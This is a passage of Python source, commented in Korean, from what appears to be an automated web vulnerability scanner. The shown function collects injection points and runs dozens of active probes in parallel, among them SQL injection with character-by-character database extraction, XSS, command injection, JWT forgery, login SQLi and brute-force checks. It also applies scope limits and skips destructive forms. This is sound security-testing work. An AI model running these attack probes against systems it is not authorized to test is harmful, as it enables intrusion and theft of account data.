                            f"{_bd.get('dbms')} {_bd.get('value_name')}='{_bd.get('db_name')}'"
                            f"{' (앞 일부)' if _bd.get('partial') else ''} 를 '문자 단위'로 실제 추출했습니다"
                            f"({_bd.get('requests')}회 질의, 읽기전용·비파괴). 각 자리 문자의 코드를 "
                            "이진탐색으로 좁혀 확정하며, 동일 기법으로 계정·비밀번호 해시 등 임의 데이터까지 "
                            "열람 가능합니다."),
                        "affected_endpoints": [_b0["url"]],
                    }
    except Exception:
        pass
    return result


async def probe_http_vulnerabilities(
    host: str,
    port: int,
    use_ssl: bool,
    http_info: dict,
    cookies: list[dict] | None = None,
    scan_id: str = "",
    discovered_urls: list[str] | None = None,
    login_candidates: list[str] | None = None,
    technologies: list | None = None,
    log_cb=None,
) -> dict:
    """
    하나의 HTTP 서비스에 대해 모든 능동 취약점 점검을 수행합니다.
    발견된 취약점만 포함한 딕셔너리를 반환합니다.
    discovered_urls: URL Discovery Engine이 발견한 추가 URL 목록
    technologies: recon 단계 기술스택 지문(①: 프로브가 스택 컨텍스트 활용 — 예: CVE 상관)
    """
    scheme = "https" if use_ssl else "http"
    base_url = f"{scheme}://{host}:{port}"

    connector = _ssl_connector()
    findings: dict = {}

    try:
        # unsafe 쿠키자: IP 호스트(예: DVWA 10.20.100.24) 대상도 인증 세션 쿠키를 실어 보낸다.
        # (기본 jar 는 IP 호스트 쿠키를 거부 → 등록해도 로그아웃 상태로 점검되던 문제 해결)
        async with aiohttp.ClientSession(connector=connector,
                                         cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
            # 세션 인지 능동 점검: 등록된 인증 세션 쿠키를 주입해 로그인 상태로 점검한다
            # (기본 OFF). 인증 영역의 주입 표면이 익명 세션으론 로그인 페이지로 튕겨 미점검되던 공백 보정.
            # per-scan 로그인 성공 시 등록된 인증 쿠키가 있으면 전역 ENABLE_AUTH_PROBE 없이도
            # 로그인 상태로 점검(쿠키는 로그인 성공 시에만 등록 → per-scan 안전).
            if auth_probe_enabled() or get_auth_cookies(scan_id):
                _ac = get_auth_cookies(scan_id)
                if _ac:
                    try:
                        from yarl import URL as _YURL
                        session.cookie_jar.update_cookies(
                            {c["name"]: c["value"] for c in _ac if c.get("name")},
                            response_url=_YURL(base_url))
                    except Exception:
                        try:
                            session.cookie_jar.update_cookies(
                                {c["name"]: c["value"] for c in _ac if c.get("name")})
                        except Exception:
                            pass
            # 스코프 가드(진입): 발견 URL 중 대상 밖 제3자 호스트를 선제 제거.
            # discovered_urls 는 stored-XSS·CSRF 동적 등 여러 프로브에도 전달되므로 여기서 한 번
            # 걸러 모든 소비자를 보호한다(제3자 스캔·오탐 원천 차단).
            if discovered_urls:
                _du0 = len(discovered_urls)
                discovered_urls = [u for u in discovered_urls if _url_in_scope(u, base_url)]
                if len(discovered_urls) < _du0:
                    print(f"[scope] 발견 URL {_du0 - len(discovered_urls)}개 대상 밖 제외(제3자 스캔 방지)",
                          flush=True)

            # 주입 지점 공통 추출(safe 모드: 발견 엔드포인트까지 청크 마이닝 확장 — S5)
            points = await _extract_injection_points(session, base_url,
                                                     discovered_urls=discovered_urls,
                                                     scan_id=scan_id)

            # API 스펙 기반 주입점 시딩 — 스펙에만 있고 HTML 엔 없는 API 엔드포인트도 능동 점검(SQLi/XSS 등).
            # (GET 쿼리 파라미터만 · in-scope · 비파괴)
            try:
                _api_pts = await _api_injection_points(session, base_url)
                if _api_pts:
                    _seen_api = {(p.get("url"), p.get("method"),
                                  tuple(sorted((p.get("params") or {}).keys()))) for p in points}
                    _added_api = 0
                    for _ap in _api_pts:
                        _k = (_ap.get("url"), _ap.get("method"),
                              tuple(sorted((_ap.get("params") or {}).keys())))
                        if _k not in _seen_api:
                            _seen_api.add(_k)
                            points.append(_ap)
                            _added_api += 1
                    if _added_api:
                        print(f"[api] OpenAPI 스펙 기반 주입점 {_added_api}개 추가(능동 API 점검)", flush=True)
            except Exception:
                _LOG.warning("API 주입점 시딩 실패(무시)", exc_info=True)

            # ① OpenAPI/Swagger 스펙 '흡수' — 스펙의 모든 (path,method)에서 query/path/body 파라미터를
            # 열거해 주입점으로 자동 생성(GET 만이 아닌 POST/PUT/DELETE + 경로/본문 파라미터까지).
            try:
                _spec_pts = await _fetch_spec_injection_points(session, base_url)
                if _spec_pts:
                    _seen_spec = {(p.get("url"), p.get("method"),
                                   tuple(sorted((p.get("params") or {}).keys()))) for p in points}
                    _added_spec = 0
                    for _sp in _spec_pts:
                        # in-scope 만
                        if not _url_in_scope(_sp.get("url", ""), base_url):
                            continue
                        _k = (_sp.get("url"), _sp.get("method"),
                              tuple(sorted((_sp.get("params") or {}).keys())))
                        if _k not in _seen_spec:
                            _seen_spec.add(_k)
                            points.append(_sp)
                            _added_spec += 1
                    if _added_spec:
                        print(f"[api] 스펙 흡수 — 자동 생성 주입점 {_added_spec}개 추가"
                              f"(POST/PUT/DELETE·경로·본문 파라미터 포함)", flush=True)
            except ScanInterrupted:
                raise
            except Exception:
                _LOG.warning("스펙 흡수 주입점 생성 실패(무시)", exc_info=True)

            # Browser Discovery 2.0 입력점 병합 — 브라우저에서 수집한 API/XHR/JSON/폼 지점을
            # 능동 점검 대상에 포함(능동 점검 前 등록됨). 위험 위치(header/cookie/path)는 제외됨.
            _bpts = _get_browser_injection_points(scan_id, host)
            if _bpts:
                _seen_bd = {(pt.get("url"), pt.get("method"),
                             tuple(sorted((pt.get("params") or {}).keys()))) for pt in points}
                for _bp in _bpts:
                    _k = (_bp.get("url"), _bp.get("method"),
                          tuple(sorted((_bp.get("params") or {}).keys())))
                    if _k not in _seen_bd:
                        _seen_bd.add(_k)
                        points.append(_bp)
                # 병합 후 주입 지점 상한(MAX_INJECTION_POINTS) — 예산·PROOF 연동 스케일(공격 표면 점수 우선)
                try:
                    import scan_depth as _sd
                    _cap = _sd.injection_points_cap()
                except Exception:
                    _cap = max(1, min(2000, int(os.getenv("MAX_INJECTION_POINTS", "40"))))
                if len(points) > _cap:
                    try:
                        import attack_surface_planner as _asp
                        points.sort(key=lambda _p: _asp.raw_point_score(_p), reverse=True)
                    except Exception:
                        pass
                    points = points[:_cap]

            # URL Discovery 결과에서 추가 주입 지점 생성
            if discovered_urls:
                # 조용한 절단 방지 + 예산 연동 깊이: 처리 대상 개수를 시간 예산·PROOF 에 비례해
                # 스케일(scan_depth). env 명시 시 사용자값 우선. 절단 시 로그로 알린다(정직성).
                try:
                    import scan_depth as _sd
                    _disc_cap = _sd.injection_candidate_cap()
                except Exception:
                    _disc_cap = max(1, min(5000, int(os.getenv("MAX_DISCOVERED_FOR_INJECTION", "500"))))
                if len(discovered_urls) > _disc_cap:
                    print(f"[injection] discovered_urls {len(discovered_urls)}개 중 상위 {_disc_cap}개만 "
                          f"주입점 후보로 처리(MAX_DISCOVERED_FOR_INJECTION) — {len(discovered_urls) - _disc_cap}개 제외",
                          flush=True)
                seen_urls = {pt["url"] for pt in points}
                _dropped_scope = 0
                for disc_url in discovered_urls[:_disc_cap]:
                    if disc_url in seen_urls:
                        continue
                    if _is_logout_url(disc_url):
                        continue   # 인증 세션 유지: 로그아웃 URL 은 GET 안 함
                    if _is_security_control_url(disc_url):
                        continue   # 보안 토글(IDS/보안수준) URL 은 GET 안 함(자기 탐지 무력화·상태변경 방지)
                    if not _url_in_scope(disc_url, base_url):
                        _dropped_scope += 1   # 대상 밖 제3자 호스트 — 능동 프로브 대상에서 제외
                        continue
                    parsed = urllib.parse.urlparse(disc_url)
                    if parsed.query:
                        params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
                        clean = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
                        if clean not in seen_urls:
                            seen_urls.add(clean)
                            points.append({"method": "GET", "url": clean, "params": params,
                                           "source": "discovered", "csrf_fields": []})

                # 딥페이지 폼 추출: 발견된 페이지의 <form> 도 파싱해 입력점으로 추가한다.
                # (예전엔 발견 URL 을 GET 쿼리 포인트로만 강등 → 딥페이지 POST 폼의 stored XSS·
                #  CSRF·form-SQLi 가 구조적으로 미도달했다.) 비용 억제: HTML 페이지만·상한 내에서.
                try:
                    _form_pages = max(0, min(200, int(os.getenv("MAX_FORM_PAGES", "25"))))
                except (TypeError, ValueError):
                    _form_pages = 25
                try:
                    import validation_profiles as _vpf
                    if _vpf.proof_active():
                        _form_pages = max(_form_pages, 120)   # PROOF: 인증 영역 폼 페이지 넓게 파싱
                except Exception:
                    pass
                _fetched = 0
                _deep_forms = 0
                for disc_url in discovered_urls[:_disc_cap]:
                    if _fetched >= _form_pages:
                        break
                    if _is_logout_url(disc_url):
                        continue   # 인증 세션 유지: 로그아웃 URL 은 딥폼 fetch 안 함
                    if _is_security_control_url(disc_url):
                        continue   # 보안 토글 URL 은 딥폼 fetch 안 함(IDS/보안수준 변경 방지)
                    if not _url_in_scope(disc_url, base_url):
                        continue
                    _pp = urllib.parse.urlparse(disc_url)
                    # 정적 자산은 폼이 없으므로 건너뜀(비용 절감)
                    if re.search(r'\.(js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|map|pdf|zip)(\?|$)',
                                 _pp.path, re.IGNORECASE):
                        continue
                    _form_base = disc_url
                    try:
                        _fst, _fbody, _fhd = await _get(session, disc_url)
                        # 디렉터리형 URL 이 슬래시가 없어 301/302 로 튕기는 경우(예: /vulnerabilities/sqli →
                        # /vulnerabilities/sqli/) 한 번 따라가 실제 페이지의 폼을 파싱한다. 폼 기준 URL 도
                        # 최종 URL 로 잡아야 주입 요청이 올바른 경로(슬래시 포함)로 가서 취약 코드가 실행됨.
                        # (이게 없으면 인증 취약 모듈 페이지가 전부 301 로 스킵돼 SQLi·CMDi·XSS 가 전멸했음)
                        if _fst in (301, 302, 303, 307, 308):
                            _loc = (_fhd or {}).get("Location") or (_fhd or {}).get("location") or ""
                            if _loc:
                                _final = urllib.parse.urljoin(disc_url, _loc)
                                if _url_in_scope(_final, base_url) and _final != disc_url:
                                    _fst, _fbody, _fhd = await _get(session, _final)
                                    _form_base = _final
                    except ScanInterrupted:
                        raise
                    except Exception:
                        continue
                    _fetched += 1
                    if _fst != 200 or "text/html" not in (_fhd.get("Content-Type", "") if _fhd else ""):
                        continue
                    for _fp in _forms_from_html(_form_base, _fbody or "", source="discovered_form"):
                        # (method, url, param 집합) 중복 방지
                        _sig = (_fp["method"], _fp["url"], tuple(sorted(_fp["params"])))
                        if _sig in seen_urls:
                            continue
                        seen_urls.add(_sig)
                        points.append(_fp)
                        _deep_forms += 1
                if _deep_forms:
                    print(f"[injection] 딥페이지 폼 {_deep_forms}개 입력점 추가"
                          f"(페이지 {_fetched}개 파싱, MAX_FORM_PAGES={_form_pages})", flush=True)
                # ★비파괴 안전장치: 상태변경(비번변경·계정삭제·비활성) 폼은 임의값을 주입·제출하면 대상
                # 상태를 '되돌릴 수 없게' 파괴한다(스캐너가 admin 비번을 바꿔 자기 로그인을 깨뜨리던 사고
                # 재발 방지, 실서비스면 계정 파손). 능동 주입 대상에서 제외하고 보고서에 '미점검(파괴 방지)'로
                # 기록한다. CSRF 등 비파괴 점검은 별도 프로브가 담당(원래 값을 안 바꿈).
                _destructive_pts = [p for p in points if p.get("destructive")]
                if _destructive_pts:
                    points = [p for p in points if not p.get("destructive")]
                    findings["_state_change_forms_skipped"] = [
                        {"url": p.get("url"), "method": p.get("method"),
                         "params": list((p.get("params") or {}).keys())}
                        for p in _destructive_pts
                    ]
                    print(f"[injection] 상태변경 폼 {len(_destructive_pts)}개 능동 주입 제외"
                          f"(비파괴 — 임의값 제출 시 대상 상태 파괴 방지, 보고서에 기록)", flush=True)
                # ★보안 태세 제어(IDS/WAF 토글·보안수준) 지점 제외: 여기에 주입하면 대상의 방어를
                # 스스로 켜거나(IDS on → 이후 페이로드 전량 차단) 취약 수준을 바꿔 자기 탐지를
                # 무력화한다(실측: DVWA phpids=on 주입 후 XSS 전량 차단·SQLi 붕괴). 대상 상태 변경이기도.
                _secctl_pts = [p for p in points if _is_security_control_point(p)]
                if _secctl_pts:
                    points = [p for p in points if not _is_security_control_point(p)]
                    findings["_security_control_skipped"] = [
                        {"url": p.get("url"), "method": p.get("method"),
                         "params": list((p.get("params") or {}).keys())}
                        for p in _secctl_pts
                    ]
                    print(f"[injection] 보안제어(IDS/보안수준) 지점 {len(_secctl_pts)}개 능동 주입 제외"
                          f"(자기 탐지 무력화·상태변경 방지, 보고서에 기록)", flush=True)
                try:
                    _max_pts = max(1, min(2000, int(os.getenv("MAX_INJECTION_POINTS", "40"))))
                except (TypeError, ValueError):
                    _max_pts = 40
                # Probe Budget Optimization: 공격 표면 점수 높은 지점을 우선 점검(상한 내 최대 효율)
                # 커버리지(무엇을 점검할지)는 '결정적 점수'로만 확정한다 — AI 로 인해 절대 줄지 않음.
                if len(points) > _max_pts:
                    try:
                        import attack_surface_planner as _asp
                        points.sort(key=lambda _p: _asp.raw_point_score(_p), reverse=True)
                    except Exception:
                        pass
                    print(f"[injection] 주입점 {len(points)}개 중 점수 상위 {_max_pts}개만 점검"
                          f"(MAX_INJECTION_POINTS) — {len(points) - _max_pts}개 제외", flush=True)
                points = points[:_max_pts]  # 주입 지점 상한(MAX_INJECTION_POINTS, 기본 40)
                # AI 조언(선택, 기본 off): '점검 순서'만 재정렬한다(커버리지는 위에서 이미 확정 →
                # 불변). 시간 제약/중단 시 유망 지점을 먼저 점검하는 효율 향상. 실패/비활성 시 그대로.
                try:
                    import ai_advisor as _aia
                    if _aia.probe_priority_enabled() and len(points) > 1:
                        _ai_order = await _aia.advise_point_priority(points)
                        if _ai_order:
                            points = _aia.reorder_by_ai(points, _ai_order)
                            print(f"[injection] AI 조언으로 점검 순서 재정렬(커버리지 불변, {len(points)}개)",
                                  flush=True)
                except Exception:
                    pass

            # 스코프 최종 가드: 어떤 소스(브라우저/발견/폼)에서 왔든 대상 밖 호스트 주입점은 제거.
            # (예: swagger 스펙이 참조하는 online.swagger.io 등 제3자 호스트로의 능동 프로브 차단)
            _before_scope = len(points)
            points = [p for p in points if _url_in_scope(p.get("url", ""), base_url)]
            _off_scope = _before_scope - len(points)
            if _off_scope:
                print(f"[scope] 대상 밖 호스트 주입점 {_off_scope}개 제외(제3자 스캔·오탐 방지)", flush=True)

            # 표준 입력점 기록(AI Payload Planner 입력용)
            try:
                _record_input_points(scan_id, points)
            except Exception:
                pass

            # 점검 커버리지 집계 — 점검 대상(주입 지점/파라미터/폼) + 카테고리별 시도 대상 수.
            try:
                import input_points as _ip
                import probe_policy as _ppol
                _n_pts = len(points)
                _n_params = sum(len(p.get("params") or {}) for p in points)
                _n_forms = sum(1 for p in points if p.get("source") in _FORM_SOURCES)

                # 컨텍스트 분류로 검색/로그인 입력점 식별
                def _ctx(p):
                    keys = list((p.get("params") or {}).keys())
                    name = keys[0] if keys else ""
                    return _ip.classify_context(name=name, url=p.get("url", ""))
                _search_n = sum(1 for p in points if _ctx(p) == "search")
                _login_n = sum(1 for p in points if _ctx(p) == "login"
                               or any("pass" in str(k).lower() for k in (p.get("params") or {})))
                _dom_n = 1 if _ppol.dom_xss_enabled() else 0
                _stored_n = (_n_forms if _ppol.stored_xss_enabled() else 0)
                _login_payloads = len(_ppol.login_sqli_payloads("balanced"))

                # login_forms/login_sqli_attempts/auth_bypass_attempts 는 _probe_login_sqli 가
                # 실제 수행 기준으로 집계하므로 여기서는 더하지 않는다(중복 방지).
                _cov_add(
                    scan_id,
                    points=_n_pts, params=_n_params, forms=_n_forms,
                    xss_attempts=_n_pts, reflected_xss_attempts=_n_pts,
                    dom_xss_attempts=_dom_n, stored_xss_attempts=_stored_n,
                    sqli_attempts=_n_pts,
                    search_inputs=_search_n,
                    cmdi_attempts=sum(
                        1 for p in points
                        if (p.get("source") == "generic")
                        or any(str(k).lower() in _CMDI_PARAMS for k in (p.get("params") or {}))
                    ),
                )
            except Exception:
                pass

            # 독립 프로브 병렬 실행
            if log_cb:
                try:
                    await log_cb(f"🔬 주입점 {len(points)}개 — SSRF·XSS(반사/저장/DOM)·SQLi·SSTI·LFI·"
                                 "CMDi·XXE·오픈리다이렉트·CORS·CRLF·CSRF 등 핵심 프로브 병렬 점검 중...")
                except Exception:
                    pass
            # SSRF: OOB 컬래보레이터(ENABLE_OOB)가 있을 때만 콜백 실증으로 수행. 없으면 no-op.
            results = await asyncio.gather(
                _probe_ssrf(session, base_url, points, scan_id=scan_id),
                _probe_xss_reflected(session, points, scan_id=scan_id),
                _probe_xss_stored(session, base_url, points, scan_id=scan_id,
                                  discovered_urls=discovered_urls),
                _probe_ssti(session, points, scan_id=scan_id),
                _probe_lfi(session, points, scan_id=scan_id),
                _probe_cmdi(session, points, scan_id=scan_id),
                _probe_sqli_oob(session, points, scan_id=scan_id),
                _probe_jndi(session, base_url, points, scan_id=scan_id),
                _probe_open_redirect(session, base_url, points, scan_id=scan_id,
                                     discovered_urls=discovered_urls),
                _probe_cors(session, base_url, scan_id=scan_id),
                _probe_crlf(session, base_url, points),
                _probe_xxe(session, base_url, points, scan_id=scan_id),
                _probe_dom_xss(session, base_url, scan_id=scan_id, discovered_urls=discovered_urls),
                _probe_file_upload(session, base_url, points, scan_id=scan_id),
                _probe_js_secrets(session, base_url),
                _probe_nosql(session, points),
                _probe_csrf(session, base_url, points),
                # CSRF 구조적 확증(비파괴 — 상태변경 폼 토큰부재/SameSite부재/GET상태변경)
                _probe_csrf_structural(session, base_url, discovered_urls=discovered_urls,
                                       scan_id=scan_id, points=points),
                _probe_vim_swp(session, base_url),
                _probe_email_header_injection(session, points),
                # Phase 2 신규
                _probe_clickjacking(session, base_url, scan_id=scan_id),
                _probe_swagger_openapi(session, base_url, scan_id=scan_id),
                _probe_graphql_introspection(session, base_url, scan_id=scan_id),
                _probe_spring_actuator(session, base_url, scan_id=scan_id),
                _probe_source_map(session, base_url),
                _probe_backup_file(session, base_url),
                # Phase 6 신규
                _probe_admin_panel(session, base_url, scan_id=scan_id),
                _probe_admin_api(session, base_url),
                _probe_framework_info(session, base_url),
                _probe_user_enumeration(session, base_url),
                _probe_csp_weaknesses(session, base_url, points, scan_id=scan_id),
                _probe_deserialization(session, base_url, points, cookies=cookies),
                _probe_csrf_dynamic(session, base_url, points, discovered_urls=discovered_urls),
                # JS-문자열/HTML-속성 컨텍스트 반사 XSS (HTML 페이로드 probe 로는 못 잡는 클래스)
                _probe_xss_js_context(session, points, scan_id=scan_id),
                _probe_xss_attr_context(session, points, scan_id=scan_id),
                # 클라이언트 전용 검증 서버측 미강제(CWE-602) — 동의/개수 가드 우회
                _probe_clientside_guard_bypass(session, base_url, points,
                                               discovered_urls=discovered_urls, scan_id=scan_id),
                # JS 노출 토큰 → 인증우회, JSONP 오용
                _probe_js_auth_token(session, base_url, discovered_urls=discovered_urls, scan_id=scan_id),
                _probe_jsonp_misuse(session, base_url, points,
                                    discovered_urls=discovered_urls, scan_id=scan_id),
                # URL 쿼리 내 민감 토큰 노출(Referer/로그 누출)
                _probe_sensitive_token_in_url(session, base_url, points,
                                              discovered_urls=discovered_urls, scan_id=scan_id),
                # 미인증 특권 콘텐츠 렌더링(서버측 인증 누락)
                _probe_unauth_privileged_content(session, base_url, points,
                                                 discovered_urls=discovered_urls, scan_id=scan_id),
                # JSON 바디 주입(모던 API — SQLi/NoSQL)
                _probe_json_injection(session, base_url, points, scan_id=scan_id),
                # GraphQL 쿼리 인자 SQLi(introspection 기반 필드 표적)
                _probe_graphql_injection(session, base_url, points,
                                         discovered_urls=discovered_urls, scan_id=scan_id),
                # GraphQL 배칭/별칭 증폭(리소스 제한 부재 — 비파괴)
                _probe_graphql_dos(session, base_url, points,
                                   discovered_urls=discovered_urls, scan_id=scan_id),
                # GraphQL 필드 제안 누출(introspection off 여도 스키마 유출)
                _probe_graphql_field_suggestion(session, base_url, points,
                                                discovered_urls=discovered_urls, scan_id=scan_id),
                # GraphQL 지시자 오버로딩(파서/검증 증폭 — 비파괴)
                _probe_graphql_directive_overload(session, base_url, points,
                                                  discovered_urls=discovered_urls, scan_id=scan_id),
                # JWT alg:none 위조·수락 능동 실증(서명 검증 우회)
                _probe_jwt_alg_none_forgery(base_url, cookies, points, scan_id=scan_id),
                # JWT alg confusion(RS256→HS256, JWKS 공개키 오용)
                _probe_jwt_alg_confusion(session, base_url, cookies, points, scan_id=scan_id),
                # 세션 고정(로그인 전후 세션 ID 회전 비교 — AUTH_* 자격증명 있을 때만)
                _probe_session_fixation(base_url, scan_id=scan_id),
                # 약한(예측 가능) 세션 식별자 — 토큰 순차증가/저엔트로피 확증(읽기전용)
                _probe_weak_session_id(session, base_url, discovered_urls=discovered_urls,
                                       scan_id=scan_id, points=points),
                # 세션 만료/로그아웃 무효화 검증(CWE-613 — AUTH_* 자격증명 있을 때만)
                _probe_logout_invalidation(base_url, scan_id=scan_id),
                # 세션 절대 수명(타임아웃) 검증(CWE-613 — AUTH_* 자격증명 있을 때만)
                _probe_session_timeout(base_url, scan_id=scan_id),
                # 유휴 세션 타임아웃 검증(CWE-613 — SESSION_IDLE_WAIT_SEC>0 opt-in)
                _probe_session_idle_timeout(base_url, scan_id=scan_id),
                # gRPC-web 서비스 발견/확증(JS grpc-web 신호 + /pkg.Service/Method 확증)
                _probe_grpc_web(session, base_url, discovered_urls=discovered_urls,
                                scan_id=scan_id),
                # h2c(평문 HTTP/2) 업그레이드 수락 감지(요청 스머글링 발판)
                _probe_h2c(base_url, scan_id=scan_id),
                # 무인증 쓰기 접근통제(BAC) — 로그인 없이 작성/수정/삭제 도달 가능? (비파괴)
                _probe_unauth_write_bac(session, base_url, points,
                                        discovered_urls=discovered_urls, scan_id=scan_id),
                # React2Shell(CVE-2025-55182) — RSC/Server Actions 역직렬화 RCE 취약 표면(비파괴)
                _probe_react2shell(session, base_url,
                                   discovered_urls=discovered_urls, scan_id=scan_id),
                # CVE 상관(스택 지문 → 알려진 CVE '확인 필요' 승격 — 전용 프로브 없는 항목)
                _probe_cve_correlation(session, base_url, scan_id=scan_id, technologies=technologies),
                return_exceptions=True,
            )
            # gather(return_exceptions=True) 는 BaseException 도 결과로 '캡처'하므로, 네트워크
            # 죽음 신호(ScanInterrupted)는 여기서 명시적으로 재전파해야 run_scan 까지 도달한다.
            for _r in results:
                if isinstance(_r, ScanInterrupted):
                    raise _r

            keys = [
                "ssrf",
                "xss_reflected", "xss_stored", "ssti", "lfi", "cmd_injection",
                "sqli_oob",
                "jndi",
                "open_redirect", "cors", "crlf", "xxe",
                "dom_xss", "file_upload", "js_secrets",
                "nosql_injection", "csrf", "csrf_form",
                "vim_swp", "email_header_injection",
                # Phase 2 신규
                "clickjacking", "swagger_openapi", "graphql_introspection",
                "spring_actuator", "source_map", "backup_file",
                # Phase 6 신규
                "admin_panel", "admin_api", "framework_info", "user_enumeration",
                "csp_bypass", "deserialization", "csrf_dynamic",
                "xss_js_context", "xss_attr_context",
                # 고도화A
                "clientside_guard_bypass", "js_auth_token", "jsonp_misuse", "token_in_url",
                "unauth_privileged_content", "api_json_injection",
                "graphql_injection", "graphql_dos", "graphql_field_suggestion",
                "graphql_directive_overload", "jwt_alg_none", "jwt_alg_confusion",
                "session_fixation", "weak_session_id", "logout_invalidation", "session_timeout",
                "session_idle_timeout",
                # 특수 프로토콜 발견
                "grpc_web_service", "h2c_smuggling",
                # 무인증 쓰기 접근통제(BAC)
                "unauth_write_bac",
                # CVE 상관: React2Shell(RSC 역직렬화 RCE)
                "react2shell",
                # CVE 상관: 스택 지문 기반 알려진 CVE 노출(확인 필요)
                "cve_exposure",
            ]
            for key, result in zip(keys, results):
                if result and not isinstance(result, Exception):
                    findings[key] = result

            # 반사형 XSS 프로브가 함께 확증한 'DOM 기반' 건을 별도 finding(dom_xss)으로 분리 등록한다.
            # (dom_xss 전용 프로브가 이미 잡았으면 그것을 우선 — 중복 방지)
            _xr = findings.get("xss_reflected")
            if isinstance(_xr, dict):
                _domf = _xr.pop("_dom_finding", None)
                if _domf and not findings.get("dom_xss"):
                    findings["dom_xss"] = _domf

            # API 인지형 심층 점검: Swagger/OpenAPI 스펙이 노출됐으면 그 스펙으로
            # 과다정보노출/Mass Assignment/BOLA 를 점검(GET 읽기 전용·SAFE).
            _sw = findings.get("swagger_openapi")
            if isinstance(_sw, dict) and _sw.get("spec_body"):
                try:
                    _api = await _probe_api_deep(session, _sw["spec_body"],
                                                 _sw.get("origin") or base_url, scan_id=scan_id)
                    if _api:
                        findings["api_audit"] = _api
                except Exception:
                    _LOG.warning("api_deep 점검 실패(무시)", exc_info=True)

            # SQL 인젝션 — error/union/boolean/time 오케스트레이션(blind 커버리지 보장).
            if log_cb:
                try:
                    await log_cb("🔎 SQL 인젝션 심화 — error/union/boolean/time 오케스트레이션 점검 중...")
                except Exception:
                    pass
            _sqli = await _orchestrate_sqli(session, points, scan_id=scan_id)
            if _sqli:
                # SQLi 확증 과정에서 나온 'DB 에러 메시지 노출'은 별도 취약점(에러페이지 정보노출·CWE-209)
                # 으로 분리한다 — SQLi 는 추출 실증으로 깔끔히, 정보노출은 그 자체로 별개 위험.
                _ed = _sqli.pop("_error_disclosure", None)
                _blindf = _sqli.pop("_blind_finding", None)
                findings["sql_injection"] = _sqli
                # 블라인드 SQLi(다른 엔드포인트에서 문자단위 추출 실증)를 별도 finding 으로.
                if isinstance(_blindf, dict) and (_blindf.get("extracted_data") or {}).get("db_name"):
                    findings["sql_injection_blind"] = _blindf
                if isinstance(_ed, dict) and _ed.get("snippet"):
                    _lk = _ed.get("leak_kinds") or _classify_error_leak(_ed.get("snippet", ""))
                    _reqline = _ed.get("request_line") or f"{_ed.get('method','GET')} {_ed.get('url','')}"
                    findings["error_info_disclosure"] = {
                        "type": "db_error", "confirmed": True,
                        "url": _ed.get("url", ""),
                        "method": _ed.get("method"), "param": _ed.get("param"),
                        "payload": f"{_ed.get('param','')}=<원래값>'  (구문오류 유발)",
                        "error_snippet": _ed.get("snippet", ""),
                        "leaked_info": _lk.get("label", ""),
                        "evidence_screenshots": _ed.get("screenshots") or [],
                        "evidence": (
                            f"【발생 위치(요청)】 {_reqline}\n"
                            f"  → 파라미터 '{_ed.get('param','')}' 에 구문오류 유발값(예: 원래값 뒤에 홑따옴표 ')을 "
                            "넣으면 서버가 상세 DB 오류를 화면에 그대로 출력합니다.\n"
                            f"【노출되는 정보】 {_lk.get('label','DB 엔진 내부 오류 메시지')}\n"
                            f"【공격자 활용(왜 취약한가)】 {_lk.get('utility') or '내부 구현 정보가 새어 후속 공격의 정확도를 높임'}\n"
                            f"【실제 노출 발췌】 {_ed.get('snippet','')[:200]}\n"
                            "(CWE-209 과도한 오류 정보 노출)"),
                        "affected_endpoints": [_ed.get("url", "")],
                    }

            # 접근제어/로직 — '수동 검토'로 떠넘기지 않고 '능동 검증'으로 확증하거나 양호 판정한다(사용자 지침).
            #   · IDOR: 인증 세션으로 객체참조를 실제 치환 접근해, 인가되지 않은 타 객체 열람이 되는지 확증.
            #   · CSRF: 능동 실제수행 프로브(csrf_form)가 전담 → 여기선 수동검토 후보를 만들지 않는다.
            #   · 파일업로드: RCE 확증 프로브(file_upload)가 전담.
            #   · 비즈니스로직: 일반화된 자동 확증이 어려워, 확증 가능한 신호만 취약으로 올리고 그 외는 미보고(양호).
            try:
                _idor = await _probe_idor_active(session, points, scan_id=scan_id)
                if _idor:
                    findings["idor"] = _idor
            except Exception:
                _LOG.warning("IDOR 능동 검증 실패(무시)", exc_info=True)

            # ── 로그인 공격 프로브는 '마지막에' 순차로 수행(공격 순서화) ──
            # 로그인 SQLi/인증우회는 반복 로그인 시도라, 대상에 계정 잠금(lockout)이 걸려 있으면
            # 스캔 초반에 돌 경우 그 뒤의 인증 점검(인증영역 크롤·주입)까지 막을 수 있다. 따라서
            # 다른 모든 점검을 마친 뒤 마지막에, 그리고 순차로(동시 로그인 부하 최소화) 실행한다.
            # (각 프로브는 이미 시도 수 상한 LOGIN_SQLI_MAX_ATTEMPTS/AUTH_BYPASS_MAX_PER_POINT 로
            #  잠금 위험을 최소화 — 여기서는 '실행 시점'만 후순위로 미룬다.) 비파괴·대조 관찰.
            _login_attacks = [
                ("login_sqli", lambda: _probe_login_sqli(
                    session, base_url, scan_id=scan_id, login_candidates=login_candidates)),
                ("sqli_auth_bypass", lambda: _probe_sqli_auth_bypass(session, points)),
                ("auth_bypass", lambda: _probe_auth_bypass(session, base_url)),
                # 브루트포스 보호 부재(임계치 없음) — 연속 실패 시도라 후순위·PROOF 전용.
                ("no_bruteforce_protection", lambda: _probe_brute_force(
                    session, base_url, scan_id=scan_id, login_candidates=login_candidates)),
            ]
            if log_cb:
                try:
                    await log_cb("🔑 로그인 공격 프로브 — 로그인 SQLi·인증 우회·브루트포스 보호 순차 점검 중...")
                except Exception:
                    pass
            for _lk, _lmk in _login_attacks:
                try:
                    _lres = await _lmk()
                    if _lres and not isinstance(_lres, Exception):
                        findings[_lk] = _lres
                except ScanInterrupted:
                    raise
                except Exception:
                    _LOG.warning(f"로그인 공격 프로브({_lk}, 후순위) 실패(무시)", exc_info=True)

    except Exception:
        _LOG.warning("probe_http_vulnerabilities 전체 실패 — 해당 호스트 부분/빈 결과 반환", exc_info=True)
    finally:
        try:
            await connector.close()
        except Exception:
            pass

    # JWT 분석 (동기 — 쿠키 데이터 활용)
    if cookies:
        jwt_r = _probe_jwt_from_cookies(cookies)
        if jwt_r:
            findings["jwt"] = jwt_r

    # ② 발굴한 GET 주입점(숨은 파라미터 마이닝 등)을 sqlmap 후보 URL 로 노출한다.
    #    외부도구 단계가 재크롤 없이 이 후보를 재사용 → 숨은 파라미터가 sqlmap 까지 도달.
    #    (rule_engine 은 template 없는 '_' 접두 메타키를 건너뛰므로 판정에 영향 없음)
    try:
        _sqli_cand: list[str] = []
        _seen_c: set = set()
